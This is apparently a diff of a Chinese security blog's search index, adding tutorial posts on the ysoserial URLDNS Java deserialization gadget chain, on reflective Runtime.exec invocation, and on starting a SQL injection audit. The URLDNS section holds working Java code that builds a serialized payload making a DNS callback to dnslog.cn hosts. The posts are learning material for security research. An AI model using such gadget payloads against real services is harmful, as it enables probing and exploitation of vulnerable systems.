@@ -1297,7 +1297,7 @@
       </tags>
   </entry>
   <entry>
-    <title>Ysoserial工具-URLDNS利用链1</title>
+    <title>Ysoserial工具-URLDNS利用链</title>
     <url>/2022/01/02/Ysoserial%E5%B7%A5%E5%85%B7-URLDNS%E5%88%A9%E7%94%A8%E9%93%BE1/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0x01-序列化"><a href="#0x01-序列化" class="headerlink" title="0x01 序列化"></a>0x01 序列化</h1><p>序列化小栗子</p>
 <p>Main.java</p>
@@ -1315,8 +1315,8 @@
 </blockquote>
 <p>个人觉得上面解释的非常详细了，大佬YYDS</p>
 <p>使用<a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper工具</a>查看序列化后的内容。</p>
-<p><img src="image-20220104174558426.png" alt="image-20220104174558426"></p>
-<p><img src="image-20220104174712009.png" alt="image-20220104174712009"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mwzueh9j20ze0syad8.jpg" alt="image-20220104174558426"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx6uihij210r0t2jub.jpg" alt="image-20220104174712009"></p>
 <p>红框里面是类、属性名、成员变量值。</p>
 <h1 id="0x02-反序列化"><a href="#0x02-反序列化" class="headerlink" title="0x02 反序列化"></a>0x02 反序列化</h1><p>小栗子：</p>
 <p>Main.java</p>
@@ -1325,15 +1325,83 @@
 <blockquote>
 <p>把单向流出的水管换为单向流入的（Output换为Input），然后把写入数据的writeObject换为readObject，即：序列化数据person.txt-&gt;File类型水管-&gt;Object类型水管-&gt;Object对象。<br>（Person）这个用法是强制类型转换，将Object转Person类型</p>
 </blockquote>
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.freebuf.com/articles/web/308461.html">https://www.freebuf.com/articles/web/308461.html</a></p>
-<p>P神代码审计-Java安全漫谈</p>
+<h1 id="0x03-URLDNS"><a href="#0x03-URLDNS" class="headerlink" title="0x03 URLDNS"></a>0x03 URLDNS</h1><p>URLDNS 是 ysoserial 中的基础链，不依赖第三方库，当然也不能执行任何命令，只能发送一个dnslog的请求。</p>
+<p>ysoserial工具中给出的 URLDNS 链</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">	HashMap.putVal()</span><br><span class="line">		HashMap.hash()</span><br><span class="line">			URL.hashCode()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>上面是作者给出的调用链，hashCode 中调用了 getHostAddress 来发送 dns 请求。</p>
+<hr>
+<p>尝试自己写 URL.hashCode() 看看触发流程</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">package ysoserial.payloads;</span><br><span class="line"></span><br><span class="line">import java.net.URL;</span><br><span class="line"></span><br><span class="line">public class getURLDNS{</span><br><span class="line">    public static void main(String[] args) throws Exception{</span><br><span class="line">        URL url = new URL("http://hevjd6.dnslog.cn");</span><br><span class="line">        url.hashCode();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx4x4xoj21e00m6tao.jpg" alt="image-20220312034603702"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mwytrhwj21cu0e0762.jpg" alt="image-20220312034625705"></p>
+<p>跟进 url.hashCode()</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx302nej21fe0dydho.jpg" alt="image-20220312034758362"></p>
+<p>当 hashCode = -1 会调用 URLStreamHandler.hashCode 方法</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mwx1u8vj21h40l477b.jpg" alt="image-20220312035035146"></p>
+<p>hashCode 会调用 getHostAddress 解析我们传入的 dns 地址。</p>
+<hr>
+<p>而作者给的 payload 中说明了 ht.put 也能触发调用链</p>
+<p>测试代码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">package ysoserial.payloads;</span><br><span class="line"></span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class getURLDNS{</span><br><span class="line">    public static void main(String[] args) throws Exception{</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        URL url = new URL("http://nx4enr.dnslog.cn");</span><br><span class="line">        hashMap.put(url,"time");</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mwzcozgj21ea0mu76q.jpg" alt="image-20220312042604914"></p>
+<p>跟进 put</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx7pnudj21uu07cwfy.jpg" alt="image-20220312042632456"></p>
+<p>可以看见调用了 putVal方法，这里传的 key和value 都是 dns 地址，并调用了 hash 处理 key</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx76mr4j21n80883zi.jpg" alt="image-20220312042714195"></p>
+<p>key 值不为空，调用 key.hashCode()</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mwy1mf5j21ic0guwgh.jpg" alt="image-20220312042810221"></p>
+<p>这里 hashCode 值默认为 -1，则会调用handler.hashCode，handler修饰符</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx3fifdj212u07uaag.jpg" alt="image-20220312042819497"></p>
+<p>transient 关键字表示变量不被序列化，应该是这里的hashCode值不被序列化。</p>
+<p>跟进 hashCode</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mwxg8w4j21c40peq6d.jpg" alt="image-20220312042905581"></p>
+<p>同 url.hashCode() 都调用了同一段代码，使用 getHostAddress 解析了 dns 地址。</p>
+<hr>
+<p>继续看作者给的 payload </p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx1i6xcj215n0u0dkf.jpg" alt="image-20220312043410186"></p>
+<p>定义了 SilentURLStreamHandler 静态类，并且类中定义了 getHostAddress 方法 和 openConnection 方法。</p>
+<p>直接测试作者给的代码，在 RUN/DEBUG 中配置如下</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx25jbfj21b40u0adn.jpg" alt="image-20220312040300275"></p>
+<p>直接跟到 getHostAddress() </p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mwyi9dwj21c40peq6d.jpg" alt="image-20220312041613007"></p>
+<p>跳转到了作者编写的 getHostAddress() 返回 null，没有解析 dns</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx2k4fyj21um0m4n0c.jpg" alt="image-20220312043743591"></p>
+<p>这是为什么？网上看大佬们的文章才了解，主要为了在生成 payload 期间多次执行，防干扰用的。</p>
+<h1 id="0x04-payload-Test"><a href="#0x04-payload-Test" class="headerlink" title="0x04 payload Test"></a>0x04 payload Test</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">package ysoserial.payloads;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class danDemo {</span><br><span class="line">    public static void main(String[] args) throws Exception{</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();</span><br><span class="line">        URL url= new URL("http://fg0a7x.dnslog.cn");</span><br><span class="line">        //通过反射获取 hashCode 方法</span><br><span class="line">        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");</span><br><span class="line">        f.setAccessible(true);//绕过Java语言权限控制检查的权限</span><br><span class="line">        f.set(url,0xdeadbeef);//hashCode第一次默认为 -1 会触发执行dns payload，所以这里设置为任意值，防止触发</span><br><span class="line">        hashMap.put(url, "time"); //这里传入任意值，不为 -1 同上 防止触发</span><br><span class="line"></span><br><span class="line">        f.set(url,-1); //重新设置为-1 ，确保反序列化的时候触发。</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("fanxlh.bin"));</span><br><span class="line">        oos.writeObject(hashMap); //将序列化的内容写入到bin文件中</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("fanxlh.bin"));</span><br><span class="line">        ois.readObject();//反序列化会触发调用</span><br><span class="line">    </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx0j1l8j21fa0u0gr7.jpg" alt="image-20220312050042250"></p>
+<p>可以看见使用 for循环 将 key 和 value 分别反序列</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx461t1j21b70u0n3b.jpg" alt="image-20220312050352881"></p>
+<p>并调用了 putVal(hash(key), key, value, false, false)</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx5rz1lj21ps0be0ue.jpg" alt="image-20220312050426808"></p>
+<p>之后的流程就和上面分析的一样了</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx887sij21fe0d80u0.jpg" alt="image-20220312050455990"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx5ehzej21fq0u0q6s.jpg" alt="image-20220312050508253"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h06mx6ag4pj21dm0jidhu.jpg" alt="image-20220312050546927"></p>
+<h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>这个链主要是因为 HashMap 实现了 Serializable 接口，并且重写了 readObject 和 writeObject 方法。</p>
+<p>给 HashMap 中传入 URL 对象，然后使用 HashMap.readObject 执行反序列化操作时，会调用 putVal 方法，而 putVal 是往 HashMap 写入键值对的方法，会 调用 hash 对 key 进行 hashCode 值计算 ，由于是 URL 对象，所以最后会调用 URLStreamHandler.hashCode 来解析 DNS 地址。</p>
+<p>JAVA反序列化RCE触发流程(三要素)</p>
+<ul>
+<li>readobject 反序列化利用点</li>
+<li>利用链</li>
+<li>RCE触发点</li>
+</ul>
+<h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><p><a href="https://www.freebuf.com/articles/web/308461.html">https://www.freebuf.com/articles/web/308461.html</a></p>
+<p><a href="https://mp.weixin.qq.com/s/ExcPN0HcSJROtE2_vVI6Hg">https://mp.weixin.qq.com/s/ExcPN0HcSJROtE2_vVI6Hg</a></p>
+<p><a href="https://xz.aliyun.com/t/9116">https://xz.aliyun.com/t/9116</a></p>
+<p><a href="https://xz.aliyun.com/t/9417#toc-2">https://xz.aliyun.com/t/9417#toc-2</a></p>
+<p><a href="https://www.anquanke.com/post/id/201762">https://www.anquanke.com/post/id/201762</a></p>
+<p>P神代码审计-Java安全漫谈-反序列化2</p>
 ]]></content>
       <categories>
-        <category>代码审计</category>
+        <category>Ysoserial工具</category>
       </categories>
       <tags>
         <tag>Java</tag>
-        <tag>反序列化利用链</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -6047,6 +6115,17 @@
 
 <p>运行结果</p>
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1j0yjbkkj313e0ewabu.jpg" alt="image-20220104122703659"></p>
+<h2 id="获取-java-lang-Runtime-反射类的片段"><a href="#获取-java-lang-Runtime-反射类的片段" class="headerlink" title="获取 java.lang.Runtime 反射类的片段"></a>获取 java.lang.Runtime 反射类的片段</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">String className     = "java.lang.Runtime";</span><br><span class="line">Class  runtimeClass1 = Class.forName(className);</span><br><span class="line">Class  runtimeClass2 = java.lang.Runtime.class;</span><br><span class="line">Class  runtimeClass3 = ClassLoader.getSystemClassLoader().loadClass(className);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>通过以上任意一种方式就可以获取<code>java.lang.Runtime</code>类的Class对象了，反射调用内部类的时候需要使用<code>$</code>来代替<code>.</code>,如<code>com.anbai.Test</code>类有一个叫做<code>Hello</code>的内部类，那么调用的时候就应该将类名写成：<code>com.anbai.Test$Hello</code></p>
+<p>反射调用<code>Runtime</code>实现本地命令执行的流程如下：</p>
+<ol>
+<li>反射获取<code>Runtime</code>类对象(<code>Class.forName("java.lang.Runtime")</code>)。</li>
+<li>使用<code>Runtime</code>类的Class对象获取<code>Runtime</code>类的无参数构造方法(<code>getDeclaredConstructor()</code>)，因为<code>Runtime</code>的构造方法是<code>private</code>的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限(<code>constructor.setAccessible(true)</code>)。</li>
+<li>获取<code>Runtime</code>类的<code>exec(String)</code>方法(<code>runtimeClass1.getMethod("exec", String.class);</code>)。</li>
+<li>调用<code>exec(String)</code>方法(<code>runtimeMethod.invoke(runtimeInstance, cmd)</code>)。</li>
+</ol>
+<p>上面的代码每一步都写了非常清晰的注释，接下来我们将进一步深入的了解下每一步具体含义。</p>
 ]]></content>
       <categories>
         <category>代码审计</category>
@@ -6921,12 +7000,42 @@
 <p><img src="image-20220306130452835.png" alt="image-20220306130452835"></p>
 <p>创建 rbac 空数据库，导入 sql 文件</p>
 <p><img src="image-20220306130554338.png" alt="image-20220306130554338"></p>
+<p>默认端口是 8088 ，可自行在 RefiningStone-RBAC(最终版)/src/main/resources/application.yml 中修改端口。</p>
+<p>至此环境搭建成功。</p>
+<h1 id="0X02-SQL注入"><a href="#0X02-SQL注入" class="headerlink" title="0X02 SQL注入"></a>0X02 SQL注入</h1><p>RBAC 管理系统 使用 Mybatis 框架操作数据库</p>
+<p><img src="image-20220306133311020.png" alt="image-20220306133311020"></p>
+<p>搜索 $ </p>
+<p><img src="image-20220306133344204.png" alt="image-20220306133344204"></p>
+<p>UserMapper.xml  id 为 getFuzzyUserByPage</p>
+<p><img src="image-20220306134130557.png" alt="image-20220306134130557"></p>
+<p>根据分层架构 ，我们找到对应的 dao 层映射文件 </p>
+<p>RefiningStone-RBAC(最终版)/src/main/java/com/codermy/myspringsecurityplus/admin/dao/UserDao.java</p>
+<p><img src="image-20220307095726845.png" alt="image-20220307095726845"></p>
+<p>实现层在 service </p>
+<p><img src="image-20220307095818124.png" alt="image-20220307095818124"></p>
 ]]></content>
       <categories>
         <category>代码审计</category>
       </categories>
       <tags>
         <tag>JAVA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ysoserial工具-CommonsCollections1</title>
+    <url>/2022/03/12/Ysoserial%E5%B7%A5%E5%85%B7-CommonsCollections1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://zhuanlan.zhihu.com/p/349838623">https://zhuanlan.zhihu.com/p/349838623</a></p>
+<p><a href="https://leihehe.top/2021/07/31/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/">https://leihehe.top/2021/07/31/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/</a></p>
+<p><a href="https://www.guildhab.top/2020/08/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e6-%e8%a7%a3%e5%af%86-ysoserial-urldns-pop-chain/">https://www.guildhab.top/2020/08/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e6-%e8%a7%a3%e5%af%86-ysoserial-urldns-pop-chain/</a></p>
+<p><a href="https://xz.aliyun.com/t/7157#toc-1">https://xz.aliyun.com/t/7157#toc-1</a></p>
+<p><a href="https://www.freebuf.com/articles/web/312175.html">https://www.freebuf.com/articles/web/312175.html</a></p>
+]]></content>
+      <categories>
+        <category>Ysoserial工具</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
 </search>
